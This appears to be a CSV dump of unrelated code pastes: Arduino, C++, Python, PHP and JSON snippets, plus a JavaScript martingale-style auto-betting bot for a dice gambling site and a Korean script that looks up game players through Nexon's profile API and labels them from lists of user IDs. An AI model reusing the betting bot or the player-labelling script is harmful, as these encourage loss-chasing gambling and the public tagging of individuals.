id,title,username,language,date,content
zNugMrzi,Sound trigger/play tune,learnelectronics,Arduino,Monday 28th of August 2023 06:59:15 AM CDT,"/****************************************
 *                                      *
 *      Sound Trigger/Play Tune         *
 *                                      *
 *      Learnelectronics (C)2023        *
 *                                      *
 *                                      *
 ****************************************/


// Define the digital pin for input and output
const int inputPin = 3;
const int outputPin = 6;

// Define the notes for the Imperial March melody
#define NOTE_B0 31
#define NOTE_C1 33
#define NOTE_B0 31
#define NOTE_C1 33
#define NOTE_D1 37
#define NOTE_E1 41
#define NOTE_F1 44
#define NOTE_G1 49
#define NOTE_A1 55
#define NOTE_B1 62
#define NOTE_C2 65
#define NOTE_D2 73
#define NOTE_E2 82
#define NOTE_F2 87
#define NOTE_G2 98
#define NOTE_A2 110
#define NOTE_B2 123
#define NOTE_C3 131
#define NOTE_D3 147
#define NOTE_E3 165
#define NOTE_F3 175
#define NOTE_G3 196
#define NOTE_A3 220
#define NOTE_B3 247
#define NOTE_C4 262
#define NOTE_D4 294
#define NOTE_E4 330
#define NOTE_F4 349
#define NOTE_G4 392
#define NOTE_A4 440
#define NOTE_B4 494
#define NOTE_C5 523
#define NOTE_D5 587
#define NOTE_E5 659
#define NOTE_F5 698
#define NOTE_G5 784
#define NOTE_A5 880
#define NOTE_B5 988
#define NOTE_C6 1047
#define NOTE_D6 1175
#define NOTE_E6 1319
#define NOTE_F6 1397
#define NOTE_G6 1568
#define NOTE_A6 1760
#define NOTE_B6 1976
#define NOTE_C7 2093
#define NOTE_D7 2349
#define NOTE_E7 2637
#define NOTE_F7 2794
#define NOTE_G7 3136
#define NOTE_A7 3520
#define NOTE_B7 3951
#define NOTE_C8 4186
#define NOTE_D8 4699
#define NOTE_REST 100


int imperialMarch[] = {
  // Star Wars Imperial March
  NOTE_G4, NOTE_G4, NOTE_G4, NOTE_E4, NOTE_A4, NOTE_A4,
  NOTE_G4, NOTE_E4, NOTE_A4, NOTE_A4, NOTE_G5, NOTE_G4,
  NOTE_E5, NOTE_D5, NOTE_D5, NOTE_C5, NOTE_C5,
  NOTE_B4, NOTE_C5, NOTE_D5, NOTE_E5, NOTE_G4,
  NOTE_A4, NOTE_C5, NOTE_E5, NOTE_G5, NOTE_G4, NOTE_E4, NOTE_A4, NOTE_A4,
  NOTE_G4, NOTE_E4, NOTE_A4, NOTE_A4, NOTE_G5, NOTE_G4,
  NOTE_E5, NOTE_D5, NOTE_D5, NOTE_C5, NOTE_C5,
  NOTE_B4, NOTE_C5, NOTE_D5, NOTE_E5, NOTE_G4
};

// Define the note durations
int noteDurations[] = {
  4, 4, 4, 4, 4, 4,
  4, 4, 4, 4, 4, 4,
  4, 8, 8, 4, 4,
  4, 8, 8, 4, 4,
  4, 4, 4, 4, 4, 4, 4, 4,
  4, 4, 4, 4, 4, 4,
  4, 8, 8, 4, 4,
  4, 8, 8, 4, 4
};

void setup() {
  // Set the input and output pins
  pinMode(inputPin, INPUT);
  pinMode(outputPin, OUTPUT);
  digitalWrite(outputPin, LOW); // Ensure the output is initially off
}

void loop() {
  // Wait for a low signal on digital pin 3
  while (digitalRead(inputPin) == HIGH) {
    delay(10); // Check the input pin every 10 milliseconds
  }

  // If a low signal is detected, play the Imperial March
  playImperialMarch();
}

void playImperialMarch() {
  // Iterate through the Imperial March melody and play each note
  for (int i = 0; i < sizeof(imperialMarch) / sizeof(int); i++) {
    int noteDuration = 1000 / noteDurations[i];
    tone(outputPin, imperialMarch[i], noteDuration);
    int pauseBetweenNotes = noteDuration * 1.30; // Add a little extra time for spacing between notes
    delay(pauseBetweenNotes);
    noTone(outputPin);
  }
}
"
ie5uM8TT,Untitled,Skos_Martren,C++,Monday 28th of August 2023 06:58:19 AM CDT,"// https://e-maxx.ru/algo/maximum_average_segment --> Алгоритм 1

class Solution {

public:

    int maxSubArray(vector<int>& nums) {
        
        // ""nums.front()"" существует ввиду ""1 <= nums.length <= 10^5""
        int PrefixSum = nums.front(); // ""int"" <-- 10^5 * 10^4 <-- 1 <= nums.length <= 10^5 AND -10^4 <= nums[i] <= 10^4
        int totalMax = nums.front(); // ограничения на totalMax следуют из ограни-й PrefixSum
        int MinPrefixSum = nums.front(); // берем минимальный префикс из отрезка [0, i - 1]

        for(int i = 1; i < nums.size(); ++i){

            PrefixSum += nums[i];

            /*  PrefixSum - MinPrefixSum == MaxSuffixSum на [0, i] -- ввиду того, что минимизируем вычитаемое для каждого 
               возможного значения PrefixSum */
            totalMax = max(totalMax, PrefixSum - MinPrefixSum); // в данной строке в MinPrefixSum записано значения из [0, i - 1]


            MinPrefixSum = min(MinPrefixSum, PrefixSum); // минимум либо был достигнут ранее -- MinPrefixSum, либо получен при последнем подсчете -- PrefixSum
        }

        return totalMax; 

    }
};"
scTRzyBG,# re_skip_quoted_etc.py,here2share,Python,Monday 28th of August 2023 06:54:00 AM CDT,"# re_skip_quoted_etc.py

import re

input_line = '''HEY 'Python World!' THIS IS A TEST LINE ""WITH SOME QUOTES"".\nHERE IS A LINE WITH """"\""TRIPLE QUOTES""\"""" included!\nI'M ALSO GLAD IT'S GREAT AT IGNORING APOSTROPHES.'''
regexed = re.findall(r'(""[^""]+""|\'[^\']+\'|""""""[^""]+""""""|\S+|\’[^\’]+\’|\n\s*|\s+)', input_line)

output = []
s = ''
for r in regexed:
	if r.startswith(('""', ""'"")):
		output += [s, r]
		s = ''
	elif r == '\n ':
		output += ['\n']
	else:
		for i, c in enumerate(r):
			s += c.lower() if i % 2 == 0 else c.upper()
		s += ''

output += [s]
output = ''.join(output)

print(output)"
zPAwNb1b,long live snowybot,coinwalk,JavaScript,Monday 28th of August 2023 06:42:45 AM CDT,"var kozster = parseFloat($('#pct_balance').val());
var gobbie = ((kozster/1000).toFixed(7));
var zeggar = gobbie;
var target = 50000;
var tens = (gobbie*10);
var sevens = (gobbie*6.1);
var eights = (gobbie*7.9);
var burgzie = kozster;
var zimple = kozster;
var blowzy = false;
var smick = ((Math.floor(kozster/tens))*tens);
var dude = ((Math.floor(kozster/tens))*tens);
var joe = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var doh = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var boggart = 0;
var bear = true;
var tuba = ((Math.floor(kozster/tens))*tens);
var razzle;
var final = document.getElementById('me').firstChild.lastChild.firstChild.children[7].innerText;
var oldDegen = 0;
var nope = 1;
 
 
function go(){
burgzie = $('#pct_balance').val();
var bog = ((burgzie-kozster).toFixed(8));
console.log(""profit:"");
console.log(bog);
if ((burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie != oldDegen)&&(burgzie>tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
}
if ((burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie != oldDegen)&&(burgzie<tuba)){
    zeggar = zeggar*2;
	nope = 0;
    oldDegen = parseFloat(burgzie);
}
if ((burgzie>=(tuba+(tens*nope)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie>=(tuba+(tens*nope)))&&(burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))){
    zeggar = gobbie*2;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie<=(dude-(tens*3)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 0;
    dude = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie>=(dude+(tens*3)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 0;
    dude = ((Math.floor(burgzie/tens))*tens);
	}
if (burgzie>=target){
console.log(""snowybot rocks"");
return;
}
doh = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var coldbet = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var milk = document.getElementById('me').firstChild.lastChild.firstChild.children[11].innerText;
if ((milk==razzle)&&(boggart>=1)&&(doh>joe)&&(!bear)){
final = document.getElementById('me').firstChild.lastChild.firstChild.children[7].innerText;
joe = parseFloat(doh);
bear = true;
}
if ((final<49.5000)&&(blowzy)&&(boggart>=1)){
zimple = zimple+zeggar
blowzy = false;
}
if ((final>=49.5000)&&(blowzy)&&(boggart>=1)){
zimple = zimple-zeggar;
blowzy = false;
}
var ficked = ((zimple*1).toFixed(7));
var migg = ((burgzie*1).toFixed(7));
if (((milk!=razzle)&&(boggart>=1)&&(doh>joe))||((ficked!=migg)&&(blowzy))){
console.log(""hacker attacked you with"");
console.log(milk);
console.log(""bet number of attack:"");
console.log(coldbet);
return;
}
if ((doh==joe)&&(bear)){
razzle = ((zeggar*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo').click();
boggart = boggart+1;
blowzy = true;
bear = false;
doh = 0;
} 
setTimeout(() => go(), 1);
}
go();

"
uKsajnxF,Untitled,joxeankoret,C++,Monday 28th of August 2023 06:29:41 AM CDT,"union valor_numerico_t {
  int entero;
  double flotante;
};

void foo(void)
{
  valor_numerico_t valor;
  // Se puede acceder a su valor como entero
  valor.entero = 1;
  // O como double
  valor.flotante = 3.14;
}


"
7K50xW4T,scr,soodalpie,JavaScript,Monday 28th of August 2023 06:12:31 AM CDT,"// 클릭 이벤트 핸들러
function handleClick() {
  console.log(""자동으로 실행되는 콘솔 명령어"");

  // 서길연 멤버 번호 리스트
  var team_user = ['1259113880', '1694882774', '151813745', '1594540715', '352970544', '872967679', '1090710587', '772191263', '839862949', '1795641065', '1829112137', '1325781095', '1308908625', '1627595738', '521073076', '1057945255', '302159888', '940512317', '1342958680', '335950711', '1443834180', '1175409261', '537009034', '1410222174', '906963770', '1259039800', '621749594', '2080521746', '1007310925', '671323354', '1980157963', '1627866554', '940019294', '1879312402', '1342958680', '1929666668', '1174443015', '151649295', '2130995909', '420016428', '671323354', '671452830', '604771804', '353935', '520695858', '1762571676', '520695858', '520695858', '1762571676', '1090710587', '1426688922', '2030469499', '1057964322', '1980481357', '939828838', '353227658', '118243585', '1846004196', '1342449385', '1947150124', '1376155044', '84566175', '335961989', '1308792077', '1326099711', '1208268272', '1896427731', '1141349635', '386453798', '872967679',  '1275320123', '1560788620', '621415548', '520695858', '1275320123', '252601628', '1325613165', '1745097357', '1795749353', '503919126', '1041182379', '1443264852', '353206787', '101482955', '1678270158', '1829400533', '1326084152', '33896287', '369193016', '17537349', '1376117163', '1007616574', '1527728354', '1627900733', '451038', '1779382465', '1040911446', '451038', '1779382465', '1040911446', '906442720', '839870735', '386247375', '805981030', '1510632878', '638017497', '1376031127', '1996754520', '872904096', '655238754', '1409944719', '403654075'];  // 원하는 번호들을 이 배열에 추가

  // 서길연 유죄작 등록자 번호 리스트
  var guiltyWorksList = ['101189220', '1057327359', '1141806546', '1174917084', '1224874545', '1225379840', '1258650033', '1309165463', '1326332792', '1544429918', '1594026858', '1661489570', '1661864153', '168589158', '1728583190', '1829405965', '1879922225', '1896205267', '1997448017', '285368666', '285838250', '286435755', '319243982', '520645875', '554210566', '604959168', '638378243', '788773770', '873266367', '873270006', '906237157', '906364746', '973998995', '1007294149', '1694949274', '1309604929', '1544316968', '269411292', '1695290429', '604798562', '285838250', '1963929393', '352773124', '1392578475', '1611306444', '369417313', '990229920', '973848970', '1845722178', '369417313', '1879922225', '906699535', '1090845015', '1175347997', '520396027', '1627743010', '1376590063', '1392578475', '1258975750', '1141757927', '637834413', '2131625177', '2081072296', '17360065', '302358132'];
  
  // 숫자 추출 함수
  function extractNumbers() {
    var elements = document.querySelectorAll(""#container > div.content > div.papers > div.grid > div.box.gd-4.report > ul > div.simplebar-wrapper > div.simplebar-mask > div > div > div > li > div.msg"");
    var numbers = [];

    for (var i = 0; i < elements.length; i++) {
      var text = elements[i].textContent;
      var regex = /\/(\d+)\//g; // 숫자를 포함하는 정규식 패턴 (/숫자/)
      var matches = text.match(regex);
      if (matches !== null) {
        for (var j = 0; j < matches.length; j++) {
          var number = matches[j].replace(/\//g, ''); // /를 제거하여 숫자만 추출
          numbers.push(number);
        }
      }
    }

    return numbers;
  }

  // 닉네임 및 클랜 정보 업데이트
  function updateNicknameAndClan(nickname, clan) {
    var nicknameElement = document.querySelector(""#container > div.content > div.papers > div.grid > div.box.gd-1.summary > div.nickname"");
    var clanElement = document.querySelector(""#container > div.content > div.papers > div.grid > div.box.gd-1.summary > div.subject"");
    var tagElement = document.querySelector(""#container > div.content > div.papers > div.grid > div.box.gd-1.summary > div.tag"");

    nicknameElement.textContent = nickname;
    clanElement.textContent = clan;

    if (team_user.includes(numbers[currentIndex])) {
      tagElement.innerHTML = ""<div style='width: 220px; height: 70px; background-color: #008080; color: white; font-size: 18px; text-align: center; line-height: 70px; margin: auto;'>서길연 무죄작 등록자</div>"";
    } else if (guiltyWorksList.includes(numbers[currentIndex])) {
      tagElement.innerHTML = ""<div style='width: 220px; height: 70px; background-color: #FF6F61; color: white; font-size: 18px; text-align: center; line-height: 70px; margin: auto;'>서길연 유죄작 등록자</div>"";
    } else {
      tagElement.innerHTML = """"; // 기본 상태로 되돌리기
    }
  }

  // 다음 페이지로 이동
  function goToNextPage() {
    var nextButton = document.querySelector(""#container > div.content > div.papers > div.paper > a.next"");
    if (nextButton) {
      nextButton.click();
    }
  }

  // 숫자 추출
  var numbers = extractNumbers();

  if (numbers.length > 0) {
    console.log(""인식한 숫자들:"", numbers);

    // API 호출 및 사용자 정보 표시
    var currentIndex = 0;

    function fetchCharacterInfo() {
      if (currentIndex >= numbers.length) {
        console.log(""모든 숫자에 대한 사용자 정보를 가져왔습니다."");
        return;
      }

      var apiUrl = `https://barracks.sa.nexon.com/api/Profile/GetProfileMain/${numbers[currentIndex]}`;

      fetch(apiUrl, {
        method: ""POST""
      })
        .then(response => response.json())
        .then(data => {
          console.log(""API 응답:"", data);
          var characterInfo = data.result?.characterInfo;
          if (characterInfo) {
            var userNick = characterInfo.user_nick;
            if (team_user.includes(numbers[currentIndex])) {
              var tagElement = document.querySelector(""#container > div.content > div.papers > div.grid > div.box.gd-1.summary > div.tag"");
              if (tagElement) {
                tagElement.innerHTML = ""<div style='width: 220px; height: 70px; background-color: #adadad; color: white; font-size: 18px; text-align: center; line-height: 70px; margin: auto;'>서길연 무죄작 등록자</div>"";
              }
            }
            var clanName = characterInfo.clan_name;
            console.log(`사용자 정보 (${numbers[currentIndex]}):`);
            console.log(""  사용자 닉네임:"", userNick);
            console.log(""  클랜 이름:"", clanName);
            updateNicknameAndClan(userNick, clanName); // 닉네임 및 클랜 정보 업데이트
          } else {
            console.log(`사용자 정보를 찾을 수 없습니다. (${numbers[currentIndex]})`);
          }

          currentIndex++;
          fetchCharacterInfo(); // 다음 숫자에 대한 사용자 정보 가져오기
        })
        .catch(error => {
          console.error(""API 호출 중 오류가 발생했습니다:"", error);
        });
    }

    fetchCharacterInfo(); // 첫 번째 숫자에 대한 사용자 정보 가져오기
  } else {
    console.log(""숫자를 찾지 못했습니다."");
    goToNextPage(); // 다음 페이지로 이동
  }
}

// 특정 요소를 15번 반복해서 클릭
var targetElement = document.querySelector(""#container > div.content > div.papers > div.paper > a.next"");
var clickCount = 0;

function clickRepeatedly() {
  if (clickCount < 999) {
    if (targetElement) {
      targetElement.addEventListener(""click"", handleClick);
      targetElement.dispatchEvent(new Event(""click""));
      targetElement.removeEventListener(""click"", handleClick);
      clickCount++;
      setTimeout(clickRepeatedly, 1000);
    } else {
      console.log(""대상 요소를 찾지 못했습니다."");
    }
  }
}

clickRepeatedly();"
tdjaP8sP,book_update,FreedTV,JSON,Monday 28th of August 2023 06:03:59 AM CDT,"{
    ""newVersion"":1000000,
    ""updateBody"":"""",
    ""name"":"""",
    ""url"":""www.baidu.com""
}"
x3HGVTr2,Protergo Exercise #1 by Rama,Hannaichi,JavaScript,Monday 28th of August 2023 06:03:42 AM CDT,"const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');

const websiteUrls = [
  'https://example.com/website1',
  'https://example.com/website2',
  // Add more URLs as needed
];

// Function to scrape product information from a website
async function scrapeWebsite(url) {
  try {
    const response = await axios.get(url);
    const $ = cheerio.load(response.data);

    // Extract product information using CSS selectors
    const products = [];
    $('.product').each((index, element) => {
      const name = $(element).find('.product-name').text().trim();
      const price = $(element).find('.product-price').text().trim();
      const details = $(element).find('.product-details').text().trim();

      products.push({ name, price, details });
    });

    return products;
  } catch (error) {
    console.error(`Error scraping ${url}: ${error.message}`);
    return [];
  }
}

// Function to scrape all websites and save the data in a structured way
async function scrapeWebsites() {
  try {
    const allProducts = [];

    for (const url of websiteUrls) {
      const products = await scrapeWebsite(url);
      allProducts.push(...products);
    }

    // Save the data as JSON
    const data = JSON.stringify(allProducts, null, 2);
    fs.writeFileSync('product_data.json', data);

    console.log('Scraping completed successfully!');
  } catch (error) {
    console.error('Error scraping websites:', error);
  }
}

// Start the scraping process
scrapeWebsites();
"
tEYQf8t5,data678,TestGuy1,JSON,Monday 28th of August 2023 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8390d6982c49025acf6aae5521dd556c9bd7bcc59451c371518573da6c3dbdbadcde18fb3683b1d8184107d3863610ed6de25681cd31e696d467780b1ccd183d5279c90528076547c5f5cc10b7793112fcbfa6711ff9d56302b881ffd61ccc08e43e59dc5531da92399207f7e6aac41717bad882a48b1d6e114e986ce79803fa',
  otherdata: [
    '89d41c6e6e96e994e5320560ff0dc080',
    '6900ad3ada39bb6e3b14ab9c8138b469',
    '317bee4119c1951c0ad43ee9d113af3c',
    '7e505c1e00ae2ebddf3bafa886bfe405',
    'a591503cc794f5c97d56ede721da715b',
    '1cbacd1588b82ac3d0e2e7f882fd395f',
    'fae6f9efe15c4467104efa9f8bd07cad',
    '3c60fc3c922b26204a2e5122103b4e31'
  ]
}"
Kq4ztx90,Untitled,wclovers,PHP,Monday 28th of August 2023 05:54:43 AM CDT,"add_filter( 'wcfm_is_allow_stripe_express_api', 'return_false' );"
